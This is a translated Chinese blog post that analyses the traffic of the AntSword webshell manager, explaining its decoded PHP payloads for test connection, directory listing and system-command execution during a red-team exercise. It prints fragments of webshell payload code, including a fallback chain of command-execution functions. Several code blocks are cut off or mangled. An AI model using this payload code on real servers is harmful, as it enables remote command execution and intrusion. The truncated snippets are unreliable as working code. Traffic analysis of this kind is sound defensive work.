# 蚁剑流量分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
之前护网的时候上传了webshell，发现蚁剑连接超时，但是冰蝎和哥斯拉都可以使用，根据我肤浅的了解，冰蝎和哥斯拉的流量是加密的，但是蚁剑不是，所以准备这次回来看看蚁剑的流量.
## 0x01 环境配置
搭建个php环境写个webshell，蚁剑配置一下代理就行，左上角->代理设置，然后改成bp上面设置的代理服务器就行了
## 0x02 测试连接流量
首先抓测试连接的包吧
这里的php代码要url解码之后再格式化一下会好看一些
    getMessage();
    };
    asoutput();
    die();
    ?>
ob_start()查了一下一堆看不懂的东西什么缓冲区啊什么的
简单理解一下就是所有执行的结果都放到一个函数里可以选择输出或者不输出
就差不多这个意思，顺便再了解一下别的ob开头的函数
ob_start() 打开输出缓冲区
ob_end_flush() 出输出缓冲区内容并关闭出书缓冲
ob_clean() 清空输出缓冲区内容
ob_end_clean() 清空发输出缓冲区并关闭输出缓冲
ob_flush() 输出输出输出缓冲区内容
ob_get_contents() 返回输出缓冲区内容
dirname()是用来返回路径中目录的部分
下面两个方法是获取当前路径的
    $_SERVER["SCRIPT_FILENAME"]
    $_SERVER["PATH_TRANSLATED"]
使用大括号是因为把里面当作可变变量
下面一个if是判断当前是windows还是linux
截取获取到路径的第一个字符如果不是 / 就开始判断有几块硬盘
把得到的硬盘数据赋值到$R
如果是 / 就不做别的直接赋值
下面添加一个tab，应该是为了格式化方便
判断posix_getegid方法是否存在，如果存在就获取一个结果，不存在就返回空，这个方法只能在linux上面使用，会返回一串数组
    Array ( [name] => www-data [passwd] => x [uid] => 33 [gid] => 33 [gecos] => www-data [dir] => /var/www [shell] => /usr/sbin/nologin )
下面一个判断如果是空字符就用另外一种方法获取用户名，总之就是获取不同系统用户名的方法吧
    posix_getegid();            #返回当前进程的有效用户ID
    get_current_user();            #获取当前 PHP 脚本所有者名称
这两个方法还是有区别的，如果在linux中使用get_current_user()会显示创建这个文件的用户，如果是root用户创建的会返回root，但是不是当前用户权限，所以在linux中不能使用这个
查了一下和什么有效用户实际用户有关系，一下子也说不清楚，到时候写篇文章专门说这个
php_uname()获取一些系统信息，拼接之后就是测试连接包返回的信息
## 0x03 列目录流量
第一个参数base64解码之后是当前路径
    getMessage();
    };
    asoutput();
    die();
    ?>
看了一下代码其实差不多，如果判断出有这个目录就格式化
定义两个变量M,L
readdir需要用循环输出所有，如果不使用循环只会输出第一个文件或文件夹，readdir返回的是资源类型，对php的造诣还没有这么深，也不是很能理解，就随便提一下吧
$P拼接路径和文件名，得到文件的绝对路径
filemtime 获取文件修改时间
fileperms 获取文件权限，如0777，0666，就是文件读写执行的权限
filesize 获取文件大小
base_convert 转换进制，第一个参数是需要转换的字符，第二个参数是现在的进制，第三个参数是需要转换的进制
这里十进制要转换成八进制，然后取后面四位
接下来就是拼接一下然后输出了
## 0X04 执行系统命令流量
    $tmp 2>&1");
                    if (fe('error_log')) {
                        error_log("a", 1);
                    } else {
                        mail("a@127.0.0.1", "", "", "-bv");
                    }
                } else {
                    return False;
                }
                $output = @file_get_contents($tmp);
                @unlink($tmp);
                if ($output != "") {
                    print ($output);
                    return True;
                }
            }
            return False;
        };
        function runcmd($c) {
            $ret = 0;
            $d = dirname($_SERVER["SCRIPT_FILENAME"]);
            if (fe('system')) {
                @system($c, $ret);
            } elseif (fe('passthru')) {
                @passthru($c, $ret);
            } elseif (fe('shell_exec')) {
                print (@shell_exec($c));
            } elseif (fe('exec')) {
                @exec($c, $o, $ret);
                print (join("
    ", $o));
            } elseif (fe('popen')) {
                $fp = @popen($c, 'r');
                while (!@feof($fp)) {